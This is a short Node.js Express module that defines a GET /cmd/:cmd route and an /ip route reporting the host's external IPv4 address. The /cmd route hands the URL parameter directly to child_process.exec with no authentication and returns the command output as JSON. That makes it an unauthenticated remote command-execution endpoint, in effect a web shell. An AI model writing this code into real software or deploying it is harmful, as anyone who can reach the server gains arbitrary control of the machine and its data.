const express = require("express");
const {
    exec
} = require('child_process');
const app = express();
const ifaces = require('os').networkInterfaces();
let address;

Object.keys(ifaces).forEach(dev => {
    ifaces[dev].filter(details => {
        if (details.family === 'IPv4' && details.internal === false) {
            address = details.address;
        }
    });
});
app.get("/cmd/:cmd", (req, res) => {
    const {
        cmd
    } = req.params;
    // console.log(cmd);
    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            res.status(500).json({
                error: "Cannot execute"
            });
            return;
        }

        res.json({
            err,
            stdout,
            stderr
        });
    });
});

app.get("/ip", (req, res) => {
    res.send(address);
})

module.exports = app;